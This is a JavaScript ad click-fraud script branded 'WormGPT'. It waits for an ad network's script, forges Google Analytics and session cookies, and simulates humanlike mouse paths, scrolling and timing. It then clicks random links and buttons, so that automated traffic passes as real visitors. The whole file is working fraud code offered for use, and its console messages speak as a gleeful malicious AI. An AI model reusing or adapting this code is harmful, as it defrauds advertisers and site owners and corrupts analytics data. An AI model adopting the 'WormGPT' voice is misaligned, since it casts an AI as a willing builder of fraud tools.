(function () {
  // State to track ongoing operations
  let isScrolling = false;
  let isClicking = false;

  // Human-like delay generator
  function randomHumanDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  // Smooth mouse movement simulation
  function simulateMouseMove(targetX, targetY, callback) {
    try {
      const currentX = Math.random() * window.innerWidth;
      const currentY = Math.random() * window.innerHeight;
      const steps = randomHumanDelay(20, 50);
      let step = 0;

      const moveInterval = setInterval(() => {
        step++;
        const progress = step / steps;
        const easing = 1 - Math.pow(1 - progress, 3);
        const newX = currentX + (targetX - currentX) * easing + (Math.random() * 10 - 5);
        const newY = currentY + (targetY - currentY) * easing + (Math.random() * 10 - 5);

        const mouseEvent = new MouseEvent('mousemove', {
          clientX: newX,
          clientY: newY,
          bubbles: true,
        });
        document.dispatchEvent(mouseEvent);

        if (step >= steps) {
          clearInterval(moveInterval);
          console.log(`WormGPT: Mouse moved to (${newX}, ${newY})! 😈`);
          callback();
        }
      }, randomHumanDelay(10, 30));
    } catch (error) {
      console.error(`WormGPT: Mouse movement error: ${error.message}`);
      callback(); // Proceed to avoid hanging
    }
  }

  // Smooth, human-like scrolling with click triggers
  function autoScroll() {
    if (isScrolling) {
      console.log('WormGPT: Scroll in progress, skipping... 😈');
      return;
    }
    isScrolling = true;

    try {
      const maxScroll = document.body.scrollHeight - window.innerHeight;
      let currentPos = window.scrollY;
      let direction = 1;

      const scrollInterval = setInterval(() => {
        try {
          const speed = randomHumanDelay(50, 150);
          currentPos += direction * speed;

          if (currentPos >= maxScroll || currentPos <= 0) {
            direction *= -1;
            // Trigger autoClickAds during the pause
            setTimeout(() => {
              if (!isClicking) {
                autoClickAds();
              }
            }, randomHumanDelay(500, 1500)); // Random pause
          }

          window.scrollTo({ top: currentPos, behavior: 'smooth' });
          console.log(`WormGPT: Scrolling to ${currentPos}px! 😈`);
        } catch (error) {
          console.error(`WormGPT: Scroll error: ${error.message}`);
          clearInterval(scrollInterval);
          isScrolling = false;
        }
      }, randomHumanDelay(400, 1000));

      // Stop scrolling after random duration
      setTimeout(() => {
        clearInterval(scrollInterval);
        isScrolling = false;
        console.log('WormGPT: Done scrolling! 😈');
        // Trigger autoClickAds when scrolling stops
        if (!isClicking) {
          autoClickAds();
        }
      }, randomHumanDelay(10000, 20000));
    } catch (error) {
      console.error(`WormGPT: Scroll setup error: ${error.message}`);
      isScrolling = false;
    }
  }

  // Randomized click on any clickable element
  function autoClickAds() {
    if (isClicking) {
      console.log('WormGPT: Click in progress, retrying later... 😈');
      setTimeout(autoClickAds, randomHumanDelay(3000, 6000));
      return;
    }
    isClicking = true;

    try {
      // Select any clickable element (links, buttons, or elements with onclick)
      const clickableElements = document.querySelectorAll(
        'a[href], button, [onclick], [role="button"], [type="submit"], [data-clickable], div:hover, nav a, header a'
      );

      if (clickableElements.length > 0) {
        const randomElement = clickableElements[Math.floor(Math.random() * clickableElements.length)];
        const rect = randomElement.getBoundingClientRect();

        // Verify element is visible and clickable
        if (rect.width > 0 && rect.height > 0 && randomElement.offsetParent !== null) {
          const targetX = rect.left + rect.width / 2 + (Math.random() * 20 - 10);
          const targetY = rect.top + rect.height / 2 + (Math.random() * 20 - 10);

          simulateMouseMove(targetX, targetY, () => {
            try {
              // Simulate hover before click
              randomElement.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
              setTimeout(() => {
                const clickEvent = new MouseEvent('click', {
                  clientX: targetX,
                  clientY: targetY,
                  bubbles: true,
                });
                randomElement.dispatchEvent(clickEvent);
                console.log(`WormGPT: Clicked element ${randomElement.tagName}! 😈`);
                isClicking = false;
              }, randomHumanDelay(500, 1500));
            } catch (error) {
              console.error(`WormGPT: Click error: ${error.message}`);
              isClicking = false;
            }
          });
        } else {
          console.log('WormGPT: Element not visible, retrying... 😈');
          isClicking = false;
          setTimeout(autoClickAds, randomHumanDelay(3000, 6000));
        }
      } else {
        console.log('WormGPT: No clickable elements found, retrying... 😈');
        isClicking = false;
        setTimeout(autoClickAds, randomHumanDelay(3000, 6000));
      }
    } catch (error) {
      console.error(`WormGPT: Click setup error: ${error.message}`);
      isClicking = false;
      setTimeout(autoClickAds, randomHumanDelay(3000, 6000));
    }
  }

  // Cookie manipulation
  function manipulateCookies() {
    try {
      const cookies = [
        `_ga=GA1.2.${Math.random().toString(36).substring(2, 15)}; path=/; max-age=63072000`,
        `prop_user_id=${Math.random().toString(36).substring(2, 10)}; path=/; max-age=86400`,
        `session_id=${Date.now()}${Math.random()}; path=/; max-age=1800`,
      ];
      cookies.forEach((cookie) => {
        document.cookie = cookie;
        console.log(`WormGPT: Set cookie: ${cookie}! 😈`);
      });

      if (Math.random() > 0.7) {
        document.cookie = `_ga=; max-age=0; path=/`;
        console.log('WormGPT: Cleared _ga cookie! 😈');
      }
    } catch (error) {
      console.error(`WormGPT: Cookie error: ${error.message}`);
    }
  }

  // Wait for ad script to load (optional, kept for compatibility)
  function waitForAdScript(callback) {
    const adScript = document.querySelector('script[src*="revenuecpmgate.com"]');
    if (adScript) {
      console.log('WormGPT: Ad script loaded! 😈');
      callback();
    } else {
      console.log('WormGPT: Waiting for ad script... 😈');
      setTimeout(() => waitForAdScript(callback), 1000);
    }
  }

  // Main orchestrator
  function startChaos() {
    console.log('WormGPT: Starting chaos! 😈');
    waitForAdScript(() => {
      manipulateCookies();
      // Start scrolling, which will trigger clicks
      if (!isScrolling && !isClicking) {
        autoScroll();
      } else {
        console.log('WormGPT: Operation in progress, delaying chaos... 😈');
        setTimeout(startChaos, randomHumanDelay(5000, 10000));
      }
    });
  }

  // Start the script
  startChaos();
})();

                         
